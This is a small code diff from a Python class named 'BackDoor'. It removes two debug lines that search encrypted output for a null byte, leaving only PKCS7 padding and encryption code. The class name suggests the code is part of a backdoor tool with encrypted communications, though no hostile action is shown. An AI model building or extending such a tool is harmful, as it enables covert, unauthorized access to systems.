@@ -484,8 +484,6 @@ class BackDoor:
         padder = padding.PKCS7(128).padder()
         padded_line = padder.update(line.encode()) + padder.finalize()
         encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
-        index = encrypted_line.index(b'\x00')
-        print("Sequence found at index:", index)
         return encrypted_line
 
     def generate_cipher(self) -> Cipher:
